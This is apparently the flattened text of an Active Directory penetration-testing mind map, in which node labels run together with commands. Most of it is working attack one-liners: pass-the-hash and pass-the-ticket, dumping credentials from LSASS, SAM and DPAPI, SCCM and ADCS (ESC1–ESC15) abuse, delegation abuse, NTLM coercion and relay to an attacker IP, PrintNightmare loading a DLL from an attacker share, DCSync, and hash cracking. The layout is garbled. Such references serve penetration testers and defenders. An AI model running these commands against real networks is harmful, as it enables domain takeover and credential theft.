Ticket (ccache / kirbi)Modify SPN PassTheTicketPassTheTickettgssub.py -in <ticket.ccache> -out <newticket.ccache> -altservice "<service>/<target>" #pr 1256proxychains secretsdump.py -k'<domain>'/'<user>'@'<ip>'Rubeus.exe ptt /ticket:<ticket>mimikatz kerberos::ptc "<ticket>"export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccacheAdminAdminimpacket tools: Same as Pass the hash but use : -k and -no-pass for impacketConvert FormatticketConverter.py <kirbi||ccache> <ccache||kirbi>NT HashOverpass the Hash / Pass the key (PTK)AdminAdmingetTGT.py <domain>/<user> -hashes :<hashes>Rubeus.exe asktgt /user:victim /rc4:<rc4value>Rubeus.exe createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe]Rubeus.exe ptt /ticket:<ticket>Pass the HashWinRM AdminAdminLow accessLow accessevil-winrm -i <ip> -u <user> -H <hash>RDP AdminAdminLow accessLow accessreg.py <domain>/<user>@<ip> -hashes ':<hash>' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>mimikatz "privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>"AdminAdminMSSQL/PseudoShell PsExec/SMB...  AdminAdminnxc : same as with creds, but use -H ':<hash>'impacket : same as with creds, but use -hashes ':<hash>'Clear text Password AdminAdminMSSQL MSSQLMSSQLmssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>nxc mssql <ip_range> -u <user> -p <password>SMB Search filesSearch filessmbclient-ng.py -d <domain> -u <user> -p <password> --host <ip>smbclient.py <domain>/<user>:<password>@<ip>RDP AdminAdminLow accessLow accessxfreerdp /u:<user> /d:<domain> /p:<password> /v:<ip>WinRM AdminAdminLow accessLow accessnxc winrm <ip_range> -u <user> -p <password> -d <domain> -x <cmd>Enter-PSSession -ComputerName <computer> -Credential <domain>\<user>evil-winrm -i <ip> -u <user> -p <password>Pseudo-shell (file write and read)nxc smb <ip_range> -u <user> -p <password> -d <domain> -x <cmd>dcomexec.py  <domain>/<user>:<password>@<ip>wmiexec.py  <domain>/<user>:<password>@<ip>smbexec.py  <domain>/<user>:<password>@<ip>atexec.py  <domain>/<user>:<password>@<ip> "command"Interactive-shell - psexec Authority/SystemAuthority/Systempsexecsvc.py <domain>/<user>:<password>@<ip>psexec.exe -AcceptEULA \\<ip>psexec.py <domain>/<user>:<password>@<ip>Admin accessMiscHybrid (Azure AD-Connect) DCSYNCDCSYNCDump cleartext password of MSOL Account on ADConnect Servernxc smb <ip> -u <user> -p <password> -M msolazuread_decrypt_msol_v2.ps1Extract Keepass User + PassUser + PassKeePwn.py trigger add -u '<user>' -p '<password>' -d '<domain>' -t <target>KeePwn.py plugin add -u '<user>' -p '<password>' -d '<domain>' -t <target> --plugin KeeFarceRebornPlugin.dllFind Users UsernameUsernamesmbmap.py --host-file ./computers.list -u <user> -p <password> -d <domain> -r 'C$\Users' --dir-only --no-write-check --no-update --no-color --csv users_directory.csvImpersonateImpersonate RDP Session RDPRDPpsexec.exe -s -i cmdquery usertscon.exe <id> /dest:<session_name>Impersonate with adcs Pass The Hash / Ticket / CertificatePass The Hash / Ticket / CertificateNTLMNTLMmasky - d <domain> -u <user>  (-p <password> || -k || -H <hash>) -ca <certificate authority> <ip>Impersonate User + PassUser + PassACLACLirs.exe listirs.exe exec -p <pid> -c <command>nxc smb <ip> -u <localAdmin> -p <password> --loggedon-usersnxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>msf> use incognito impersonate_token <domain>\\<user>Extract credentials from DPAPICrack users masterkey DPAPImkDPAPImkcopy c:\users\<user>\AppData\Roaming\Microsoft\Protect\<SID>DPAPImk2john.py --preferred <prefered_file>DPAPImk2john.py -c domain -mk <masterkey> -S <sid>DPAPI Clear text moveClear text movePassTheHashPassTheHashUser + PassUser + PassSharpDPAPI.exe triageget masterkeylsassy -d <domain> -u <user> -p <password> <ip> -m rdrleakdiag -M masterkeysdploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>mimikatz "sekurlsa::dpapi"dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>dpapidump.py <domain>/<user>:<password>@<target>donpapi <domain>/<user>:<password>@<target>nxc smb <ip_range> -u <user> -p <password> --dpapi [cookies] [nosystem]Extract credentials from LSA User + PassUser + PassMsCache 2MsCache 2reg.py <domain>/<user>:<password>@<ip> backup -o '\\<smb_ip>\share'reg save HKLM\SECURITY <file>;  reg save HKLM\SYSTEM <file>secretsdump.py -system SYSTEM -security SECURITYmimikatz "privilege::debug" "lsadump::lsa" "exit"nxc smb <ip_range> -u <user> -p <password> --lsaExtract credentials from SAM PassTheHashPassTheHashNTLMNTLMregsecrets.py <domain>/<user>:<password>@<ip>reg.py <domain>/<user>:<password>@<ip> backup -o '\\<smb_ip>\share'secretsdump.py -system SYSTEM -sam SAM LOCALreg save HKLM\SAM <file>;  reg save HKLM\SYSTEM <file>secretsdump.py -system SYSTEM -sam SAM LOCALsecretsdump.py <domain>/<user>:<password>@<ip>mimikatz "privilege::debug" "lsadump::sam" "exit"msf> hashdumpnxc smb <ip_range> -u <user> -p <password> --samExtract credentials from LSASS.exeExtract LSASS secrets  Clear text moveClear text movePassTheHashPassTheHashNTLMNTLMUser + PassUser + Passlsassy -d <domain> -u <user> -p <password> <ip>nxc smb <ip_range> -u <user> -p <password> -M lsassymsf> load kiwi creds_allmimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords"  "exit"procdump.exe -accepteula -ma lsass.exe lsass.dmpLSASS as protected processmimikatz "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "token::elevate"  "sekurlsa::logonpasswords" "!processprotect  /process:lsass.exe" "!-"PPLdump64.exe <lsass.exe|lsass_pid> lsass.dmp #before 2022-07-22 updateSCCMPost exploitas sccm adminSCCMHound.exe --server <server> --sitecode <sitecode>Users sessionsUsers sessionsCleanupSharpSCCM.exe get devices -sms <SMS_PROVIDER> -sc <SITECODE> -n <NTLMRELAYX_LISTENER_IP> -p "Name" -p "ResourceId" -p "SMSUniqueIdentifier"SharpSCCM.exe remove device GUID:<GUID> -sms <SMS_PROVIDER> -sc <SITECODE>EXEC-1/2 SCCM admin latlatsccmhunter.py admin -u <user>@<domain> -p '<password>' -ip <sccm_ip>SharpSCCM.exe exec -p <binary> -d <device_name> -sms <SMS_PROVIDER> -sc <SITECODE> --no-bannerCreds-5 SCCM admin Site DB credentialsSite DB credentialssecretsdump.py <domain>/<admin>:'<pass>'@<sccm_target>mssqlclient.py -windows-auth -hashes '<sccm_target_hashNT>' '<domain>/<sccm_target>$'@<sccm_mssql>get_device <hostname>interact <device_id>script xploit.ps1use CM_<site_code>;SELECT * FROM SC_UserAccount;sccmdecryptpoc.exe <cyphered_value>Creds-3Creds-4 Computer Admin user NAA credentialsNAA credentialsSharpSCCM.exe local secrets -m wmiSharpSCCM.exe local secrets -m disksccmhunter.py dpapi  -u <admin> -p '<password>' -target <sccm_target> -debugdploot.py sccm -u <admin> -p '<password>' <sccm_target>Creds-2:Policy Request Credentials Simple userUser + PassUser + Passadd computerSharpSCCM.exe get secrets -r newcomputer -u <computer_added>$ -p <computer_pass>"cleanupsccmwtf.py newcomputer newcomputer.<domain> <target> '<domain>\<computer_added>$' '<computer_pass>'get NetworkAccessUsername and NetworkAccessPasswordpolicysecretunobfuscate.pydelete device created after sccmadminTakeover-2:relay to mssql server Simple userAdmin MSSQLAdmin MSSQLSCCM MSSQL != SSCM serverntlmrelayx.py -t <sccm_mssql> -smb2support -sockscoerce sccm_server proxychains smbexec.py -no-pass <domain>/'<sccm_server>$'@<sccm_ip>Takeover-1:relay to mssql db Simple userSCCM ADMINSCCM ADMINSCCM MSSQL != SSCM serversccmhunter.py mssql -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug -tu <target_user> -sc <site_code> -stackedntlmrelayx.py -smb2support -ts -t mssql://<sccm_mssql> -q "<query>"coerce sccm_mssql -> attackersccmhunter.py admin -u <target_user>@<domain> -p '<password>' -ip <sccm_ip>CRED-6 Loot creds User + PassUser + PassSCCM HTTP service (80/TCP or 443/TCP) on a DPsccm-http-looter -server <ip_dp>SCCMSecrets.py files -dp http://<distribution_point> -u '<user>' -p '<password>'SCCMSecrets.py policies -mp http://<management_point> -u '<machine_account>$' -p '<machine_password>' -cn '<client_name>'SCCM SMB service (445/TCP) on a DPcmloot.py <domain>/<user>:<password>@<sccm_dp> -cmlootinventory sccmfiles.txtElevate-3:Automatic client push Simple userRelay ntlmRelay ntlmCreate DNS A record for non existing computer xdnstool.py -u '<domain>\<user>' -p <pass>  -r <newcomputer>.<domain> -a add -t A -d <attacker_ip> <dc_ip>Enroll new computer x in AD  then remove host SPN from the machine accountsetspn -D host/<newcomputer> <newcomputer> setspn -D host/<newcomputer>.<domain> <newcomputer>wait 5m for client pushntlmrelayx.py -tf <no_signing_target> -smb2support -sockscleanupElevate-2:Force client push Simple userAdminAdminntlmrelayx.py -t <sccm_server> -smb2support -socks # listen connectionSharpSCCM.exe invoke client-push -mp <sccm_server>.<domain> -sc <site_code> -t <attacker_ip> # Launch client push installproxychains smbexec.py -no-pass <domain>/<socks_user>@<sccm_server>cleanupElevate-1:Relay on site systems Simple userAdmin on Site systemAdmin on Site systemcoerce sccm site serverntlmrelayx.py -tf <site_systems> -smb2supportCreds-1 No credentials User + PassUser + PassNAA credentialsNAA credentialsExtract from pxe See no creds PXEPXEreconnxc smb <sccm_server> -u <user> -p <password> -d <domain> --sharesldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccmsccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debugsccmhunter.py show -allADCSAbuse Certificate MappingESC14 (explicit)ESC9/ESC10 (implicit)reset accountB UPNcertipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn <accountB>@<domain>Pass The CertificatePass The Certificate[Schannel Mapping] ESC9/ESC10 (Case 2)[Kerberos Mapping] ESC9/ESC10(Case 1)certipy shadow auto -username <accountA>@<domain> -p <passA> -account <accountB>ESC10 (Case 2)certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn '<dc_name$>@<domain>'ESC10  Case1ESC10  Case1ESC9/ESC10 (Case 1)certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn Administratorreset accountB UPNreset accountB UPNESC10 (case 1)certipy req  -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <any template with client auth>ESC9certipy req  -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <vulnerable template>Misconfigured Certificate AuthorityESC11 Pass the ticketPass the ticketDCSYNCDCSYNCDomain AdminDomain Admincertipy relay -target rpc://<ip_ca> -ca '<ca_name>'certipy auth -pfx <certificate> -dc-ip <dc_ip>ntlmrelayx.py -t rpc://<ca_ip> -smb2support -rpc-mode ICPR -icpr-ca-name <ca_name>gettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /pttESC6  ESC1ESC1Abuse ATTRIBUTESUBJECTALTNAME2 flag set on CA you can choose any certificate template that permits client authenticationVulnerable PKI Object access controlESC5Golden certificate certipy ca -backup -u <user>@<domain> -hashes <hash_nt> -ca <ca_name> -debug -target <ca_ip>certipy forge -ca-pfx '<adcs>.pfx' -upn administrator@<domain>Pass the certificatePass the certificateVulnerable acl on PKI ACLACLMisconfigured ACLESC7Manage certificateIssue requestcertipy ca -u <user>@<domain> -p '<password>' -ca <ca_name> -issue-request <request_id>certipy req -u <user>@<domain> -p '<password>'  -ca <ca_name> -retreive <request_id>Pass the certificatePass the certificatecertipy ca  -ca <ca_name> -enable-template '<ecs1_vuln_template>' -username <user>@<domain> -password <password>certipy  req -username <user>@<domain> -password <password> -ca <ca_name> -template '<vulnerable template name>' -upn '<target_user>'error, but save private key and get issue requestManage CAcertipy ca -ca <ca_name> -add-officer  '<user>' -username <user>@<domain> -password <password> -dc-ip <dc_ip> -target-ip <target_ip>ESC7 Manage certificateESC7 Manage certificateESC4write privilege over a certificate templaterestore templatecertipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -configuration <template>.jsoncertipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -save-old -debugESC1ESC1Misconfigured Certificate TemplateESC15certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template with enrolee flag>' -ca <ca_name> --application-policies 'Certificate Request Agent' # [PR 228]Pass the certificatePass the certificatecertipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name> -on-behalf-of '<domain>\<user>' -pfx <cert>certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template with enrolee flag>' -ca <ca_name> -upn <target_user>@<domain> --application-policies 'Client Authentication' #[PR 228]Pass the certificate (only Schannel)Pass the certificate (only Schannel)ESC13 Pass The Certificate (PKINIT)Pass The Certificate (PKINIT)certify.exe request /ca:<server>\<ca-name> /template:"<vulnerable template name>"certipy req -u <user>@<domain> -p <password> -target <ca_server>  -template '<vulnerable template name>' -ca <ca_name>ESC3certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>'  -ca <ca_name>certipy req -u <user>@<domain> -p <password> -target <ca_server> -template  '<vulnerable template name>'  -ca <ca_name> -on-behalf-of '<domain>\<user>' -pfx <cert>certify.exe request /ca:<server>\<ca-name> /template:"<vulnerable template name>"certify.exe request request /ca:<server>\<ca-name> /template:<template>  /onbehalfof:<domain>\<user> /enrollcert:<path.pfx> [/enrollcertpw:<cert-password>]ESC2 ESC3ESC3ESC1 Pass the certificatePass the certificatecertify.exe request /ca:<server>\<ca-name>   /template:"<vulnerable template name>" [/altname:"Admin"]certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>'  -ca <ca_name> -upn <target_user>@<domain>Web Enrollment Is Up Domain adminDomain adminESC8 Pass the ticketPass the ticketLDAP shellLDAP shellDCSYNCDCSYNCcertipy relay -target http://<ip_ca>certipy auth -pfx <certificate> -dc-ip <dc_ip>ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainControllergettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /pttEnumeration Vulnerable PKI Object ACVulnerable PKI Object ACMisconfigured ACLMisconfigured ACLVulnerable CAVulnerable CAVulnerable templateVulnerable templateWeb enrollementWeb enrollementDisplay CA informationcertify.exe cascertutil -TCAInfoGet PKI objects informationcertify.exe pkiobjectsldeep ldap -u <user> -p <password> -d <domain> -s <dc_ip> templatescertipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip>certify.exe find [ /vulnerable]certutil -v -dsTemplateKerberos DelegationS4U2self abusegetTGT.py -dc-ip "<dc_ip>" -hashes :"<machine_hash>" "<domain>"/"<machine>$"getST.py -self -impersonate "<admin>" -altservice "cifs/<machine>" -k -no-pass -dc-ip "DomainController" "<domain>"/'<machine>$'AdminAdminGet machine account (X)'s TGTGet a ST on X as user adminResource-Based Constrained DelegationRBCD With added computer accountrbcd.py -delegate-from '<computer>$' -delegate-to '<target>$' -dc-ip '<dc>' -action 'write' <domain>/<user>:<password>getST.py -spn host/<dc_fqdn> '<domain>/<computer_account>:<computer_pass>' -impersonate Administrator --dc-ip <dc_ip>Kerberos TGTKerberos TGTAdminAdminRubeus.exe hash /password:<computer_pass> /user:<computer> /domain:<domain>Rubeus.exe s4u /user:<fake_computer$> /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/<victim.domain.local> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /pttAdminAdminadd computer accountaddcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>'Constrained delegationWithout protocol transition (kerberos only) UAC: TRUSTED_FOR_DELEGATIONSelf RBCD Like RBCD without add computerRBCD With added computer account Kerberos TGSKerberos TGSrbcd.py -delegate-from '<rbcd_con>$' -delegate-to '<constrained>$' -dc-ip '<dc>' -action 'write' -hashes '<hash>' <domain>/<constrained>$getST.py -spn host/<constrained> -impersonate Administrator --dc-ip <dc_ip> '<domain>/<rbcd_con>$:<rbcd_conpass>'getST.py -spn <constrained_spn>/<target> -hashes '<hash>' '<domain>/<constrained>$' -impersonate Administrator --dc-ip <dc_ip> -additional-ticket <previous_ticket>add computer accountaddcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>'Constrain between Y and ZAdd computer XAdd RBCD : delegate from X to Ys4u2self X (impersonate admin)S4u2Proxy X (impersonate admin on spn/Y)Forwardable TGS for YS4u2Proxy Y (impersonate admin on spn/Z)With protocol transition (any) UAC: TRUST_TO_AUTH_FOR_DELEGATIONgetST.py -spn '<spn>/<target>' -impersonate Administrator -dc-ip '<dc_ip>' '<domain>/<user>:<password>' -altservice <altservice>Altservice HTTP/HOST/CIFS/LDAP Kerberos TGSKerberos TGSRubeus.exe hash /password:<password>Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<AES 256 hash>Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<admin_user> /msdsspn:<spn_constrained> /altservice:<altservice> /pttAltservice HTTP/HOST/CIFS/LDAP  Kerberos TGSKerberos TGSGet TGT for userRequest S4u2selfRequest S4u2proxyUnconstrained delegation Kerberos TGTKerberos TGTPassTheTicketPassTheTicketUAC: ADS_UF_TRUSTED_FOR_DELEGATIONForce connection  with coerceGet tickets Rubeus.exe monitor /interval:5Rubeus.exe dump /luid:0xdeadbeef /nowrapRubeus.exe dump /service:krbtgt /nowrapmimikatz privilege::debug sekurlsa::tickets /export sekurlsa::tickets /exportFind delegationWith BloodHoundConstrainedMATCH p=shortestPath((u:User)-[*1..]->(c:Computer {name: "<MYTARGET.FQDN>"})) RETURN pMATCH p=((c:Base)-[:AllowedToDelegate]->(t:Computer)) RETURN pUnconstrainedMATCH (c:User {unconstraineddelegation:true}) RETURN cMATCH (c:Computer {unconstraineddelegation:true}) RETURN cfindDelegation.py "<domain>"/"<user>":"<password>"ACLs/ACEs permissionsDNS AdminDNSadmins abuse (CVE-2021-40469)  AdminAdminsc \\DNSServer stop dns sc \\DNSServer start dnsdnscmd.exe /config /serverlevelplugindll <\\path\to\dll> # need a dnsadmin userGPOGeneric Write on  GPOAbuse GPO ACCESSACCESSReturn the principals that can write to the GP-Link attribute on OUsGet-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | flSID of principals that can create new GPOs in the domainGet-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=blah,DC=com" -ResolveGUIDs  | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | flWho can control GPOsMATCH p=((n:Base)-[]->(gp:GPO)) RETURN pGet LAPS passwordsRead LAPS AdminAdminmsf> use post/windows/gather/credentials/enum_lapsnxc ldap <dc_ip> -d <domain> -u <user> -p <password> --module lapsforeach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> lapsGet-LapsADPassword -DomainController <ip_dc> -Credential <domain>\<login> | Format-Table -AutoSizeWho can read LAPSMATCH p=(g:Base)-[:ReadLAPSPassword]->(c:Computer) RETURN pReadGMSAPasswordldeep ldap -u <user> -p <password> -d <domain> -s ldaps://<dc_ip> gmsanxc ldap <ip> -u <user> -p <pass> --gmsagMSADumper.py -u '<user>' -p '<password>' -d '<domain>'On OUGenericAll / GenericWrite / Manage Group Policy LinksOUned.py --config config.iniWrite DaclACE InheritanceGrant rightsOn UserForceChangePasswordnet user <user> <password> /domainUser with clear text passUser with clear text passGenericAll / GenericWritelogin script AccessAccessadd key credentials shadow credentialsshadow credentialsadd SPN (target kerberoasting)targetedKerberoast.py -d <domain> -u <user> -p <pass>Hash found (TGS)Hash found (TGS)Change passwordnet user <user> <password> /domainUser with clear text passUser with clear text passOn ComputerGenericAll / GenericWriteadd Key Credentials shadow credentialsshadow credentialsmsDs-AllowedToActOnBehalf RBCDRBCDOn GroupWriteDACL + WriteOwnerGrant rightsGive yourself generic allWrite OwnerGrant OwnershipGenericAll/GenericWrite/Self/Add Extended RightsAdd member to the groupcan change msDS-KeyCredentialLInk (Generic Write) + ADCSPassTheCertificatePassTheCertificateShadow Credentialspywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"certipy shadow auto '-u <user>@<domain>' -p <password> -account '<target_account>'Dcsync Crack hashCrack hashLateral moveLateral moveDomain AdminDomain Adminsecretsdump.py '<domain>'/'<user>':'<password>'@'<domain_controller>'mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\administratorAdministrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accountsKnow vulnerabilities authenticatedProxyNotShell (CVE-2022-41040, CVE-2022-41082)AdminAdminpoc_aug3.py <host> <username> <password> <command>Certifried (CVE-2022-26923) PTTPTTDCSYNCDCSYNCDomain adminDomain adminAuthenticationcertipy auth -pfx <pfx_file> -username '<dc>$' -domain <domain> -dc-ip <dc_ip>Requestcertipy req -u 'certifriedpc$'@<domain> -p 'certifriedpass' -target <ca_fqdn> -ca <ca_name> -template MachineCreate accountcertipy account create -u <user>@<domain> -p '<password>' -user 'certifriedpc' -pass 'certifriedpass' -dns '<fqdn_dc>'PrintNightmare (CVE-2021-1675, CVE-2021-34527)AdminAdminprintnightmare.py -dll '\\<attacker_ip>\smb\add_user.dll' '<user>:<password>@<ip>'nxc smb <ip> -u 'user' -p 'pass' -M printnightmare #scannoPac (CVE-2021-42287, CVE-2021-42278)PTTPTTDCSYNCDCSYNCDomain adminDomain adminnoPac.exe -domain <domain> -user <user> -pass <password> /dc <dc_fqdn> /mAccount <machine_account> /mPassword <machine_password> /service cifs /pttnxc smb <ip> -u 'user' -p 'pass' -M nopac #scanPrivExchange (CVE-2019-0724, CVE-2019-0686)HTTP CoerceHTTP CoerceAdminAdminDomain adminDomain adminprivexchange.py -ah <attacker_ip> <exchange_host> -u <user> -d <domain> -p <password>GPP MS14-025 Domain adminDomain adminGet-GPPPassword.py <domain>/<user>:<password>@<dc_fqdn>findstr /S /I cpassword \\<domain_fqdn>\sysvol\<domain_fqdn>\policies\*.xmlmsf> use auxiliary/scanner/smb/smb_enum_gppMS14-068 PTTPTTAdminAdminDomain adminDomain adminfindSMB2UPTime.py <ip>goldenPac.py -dc-ip <dc_ip> <domain>/<user>:<password>@targetmsf> use auxiliary/admin/kerberos/ms14_068_kerberos_checksumms14-068.py -u <user>@<domain> -p <password> -s <user_sid> -d <dc_fqdn>Low access (Privilege escalation)From Service account (SEImpersonate)AdminAdminRemotePotato0PrintSpoofer GodPotato RoguePatato Kerberos Relay AdminAdminKrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName <computer$> -ComputerPassword <password>KrbRelayUp.exe spawn -m rbcd -d <domain> -dc <dc> -cn <computer_name>-cp <omputer_pass>Webdav HTTP CoerceHTTP Coerceopen file <file>.searchConnector-msdnstool.py -u <domain>\<user> -p <pass> --record 'attacker' --action add --data <ip_attacker> <dc_ip>petitpotam.py -u '<user>' -p <pass> -d '<domain>' "attacker@80/random.txt" <ip>Exploit AdminAdminCVE-2021-36934 (HiveNightmare/SeriousSAM)vssadmin list shadowsSMBGhost CVE-2020-0796 Search files User AccountUser Accountfindstr /si 'pass' *.txt *.xml *.docx *.iniAuto Enum AdminAdmin.\PrivescCheck.ps1;  Invoke-PrivescCheck -Extended"winPEASany_ofs.exeUAC bypass AdminAdminmsdt.exewsreset.exeFodhelper.exeBypass Applocker Low access (without applocker)Low access (without applocker)MsBuild.exe pshell.xmlmshta.exe my.htainstallutil.exe /logfile= /LogToConsole=false /U C:\runme.exefiles in writables pathsC:\Windows\TasksC:\Windows\TempGet-Applocker infosGet-ChildItem -Path HKLM:\SOFTWARE\Policies \Microsoft\Windows\SrpV2\Exe (dll/msi/...)Valid Credentials (cleartext creds, nt hash, kerberos ticket)Exploit know vulnerabilitiesknow vulnerabilitiesCan Connect to a computer Lateral moveLateral moveIntra ID ConnectFind MSOLnxc ldap <dc_ip> -u '<user>' -p '<password>' -M get-desc-users |grep -i MSOLCoerceCoerce kerberos SMB Kerberos coerceSMB Kerberos coercednstool.py -u "<domain>\<user>" -p '<password>' -d "<attacker_ip>" --action add "<dns_server_ip>" -r "<servername>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" --tcppetitpotam.py -u '<user>' -p '<password>' -d <domain> '<servername>1UWh...' <target>RPC call SMB NTLM CoerceSMB NTLM Coercecoercer.py -d <domain> -u <user> -p <password> -t <target> -l <attacker_ip>petitpotam.py -d <domain> -u <user> -p <password> <listnerer_ip> <target_ip>printerbug.py <domain>/<username>:<password>@<printer_ip> <listener_ip>WebdavLaunch coerce with <attacker_hostname>@80/x as targetHTTP CoerceHTTP Coerceadd attack computer in dnsdnstool.py -u <domain>\<user> -p <pass> --record <attack_name> --action add --data <ip_attacker> <dc_ip>Enable webclient.searchConnector-msnxc smb <dc_ip> -u '<user>' -p '<password>' -M drop-scDrop fileOther filesntlm_theft.py -g all -s <your_ip> -f test.url[InternetShortcut]... IconFile=\\<attacker_ip>\%USERNAME%.icon.scfnxc smb <dc_ip> -u '<user>' -p '<password>' -M sucffy -o NAME=<filename> SERVER=<attacker_ip>.lnknxc smb <dc_ip> -u '<user>' -p '<password>' -M slinky -o NAME=<filename> SERVER=<attacker_ip>Kerberoasting Hash TGSHash TGSRubeus.exe kerberoastGetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>MATCH (u:User) WHERE u.hasspn=true AND u.enabled = true AND NOT u.objectid ENDS WITH '-502' AND NOT COALESCE(u.gmsa, false) = true AND NOT COALESCE(u.msa, false) = true RETURN uScan AutoImport-Module .\adPEAS.ps1; Invoke-adPEAS -Domain '<domain>' -Server '<dc_fqdn>'PingCastle.exe --healthcheck --server <domain>from BH resultAD-miner -c -cf Report -u <neo4j_username> -p <neo4j_password>Enumerate SCCM SCCM ExploitationSCCM ExploitationSharpSCCM.exe local site-infoldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccmsccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debugEnumerate ADCS ADCS ExploitationADCS Exploitationcertipy find -u <user>@<domain> -p '<password>' -dc-ip <dc_ip>certify.exe findClassic Enumeration (users, shares, ACL, delegation, ...)Enumerate DNS New targets (low hanging fruit)New targets (low hanging fruit)adidnsdump -u <domain>\\<user> -p "<password>" --print-zones <dc_ip>Enumerate Ldap UsernameUsernameDelegationDelegationACLACLldapsearch-ad.py -l <dc_ip> -d <domain> -u <user> -p '<password>' -o <output.log> -t allldapdomaindump.py -u <user> -p <password> -o <dump_folder> ldap://<dc_ip>:389ldeep ldap -u <users> -p '<password>' -d <domain> -s ldap://<dc_ip> all <backup_folder>Bloodhound CE UsernameUsernameDelegationDelegationACLACLSOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output --autosplit --threshold 900sharphound.exe -c all -d <domain>rusthound-ce -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z --ldap-filter=(objectGuid=*)bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c allBloodhound Legacy UsernameUsernameDelegationDelegationACLACLsharphound.exe -c all -d <domain>import-module sharphound.ps1;invoke-bloodhound -collectionmethod all -domain <domain>rusthound -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -zbloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c allEnumerate SMB share Scroll sharesScroll sharesmanspider <ip_range> -c passw -e <file extensions> -d <domain> -u <user> -p <password>nxc smb <ip_range> -u '<user>' -p '<password>' --shares [--get-file \\<filename> <filename>]nxc smb <ip_range> -u '<user>' -p '<password>' -M spider_plusFind all users UsernameUsernamenxc smb <dc_ip> -u '<user>' -p '<password>' --usersGetADUsers.py -all -dc-ip <dc_ip> <domain>/<username>Crack hashpxe hash ($sccm$aes128$...)hashcat -m 19850 -a 0 hash.txt <rockyou.txt>Timeroast hash ($sntp-ms$...)hashcat -m 31300 -a 3 hash.txt -w 3 ?l?l?l?l?l?l?l MSCache 2 (very slow) ($DCC2$10240...)hashcat -m 2100 -a 0 hash.txt <rockyou.txt>Kerberos ASREP ($krb5asrep$23...)hashcat -m 18200 -a 0 hash.txt <rockyou.txt>Kerberos 5 TGS AES128 ($krb5tgs$17...)hashcat -m 19600 -a 0 hash.txt <rockyou.txt>Kerberos 5 TGS ($krb5tgs$23$...)hashcat -m 13100 -a 0 hash.txt <rockyou.txt>john --format=krb5tgs hash.txt --wordlist=<rockyou.txt>NTLMv2 (user::N46iSNek...)hashcat -m 5600 -a 0 hash.txt <rockyou.txt>john --format=netntlmv2 hash.txt --wordlist=<rockyou.txt>NTLMv1 (user::85D5BC...)crack.shhashcat -m 1000 -a 0 hash.txt <rockyou.txt>john --format=netntlm hash.txt --wordlist=<rockyou.txt>NT 